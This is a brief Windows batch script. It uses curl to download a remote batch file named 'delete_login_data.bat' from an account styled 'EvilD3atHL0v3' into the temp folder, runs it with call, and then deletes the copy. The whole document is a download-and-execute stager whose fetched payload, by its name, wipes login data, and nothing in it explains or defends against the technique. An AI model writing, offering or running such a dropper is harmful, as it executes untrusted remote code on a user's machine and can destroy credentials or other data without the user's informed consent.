@echo off

:: Set the URL of the file to download
set "fileURL=https://github.com/EvilD3atHL0v3/BatchScript/blob/main/delete_login_data.bat"

:: Set the location to save the downloaded file
set "downloadPath=%TEMP%\script.bat"

:: Download the file using curl
curl -o "%downloadPath%" "%fileURL%"

:: Check if download was successful
if %errorlevel% neq 0 (
    echo Failed to download the file.
    exit /b
)

:: Execute the downloaded file
call "%downloadPath%"

:: Clean up the downloaded file (optional)
del "%downloadPath%"

echo Script execution complete.

pause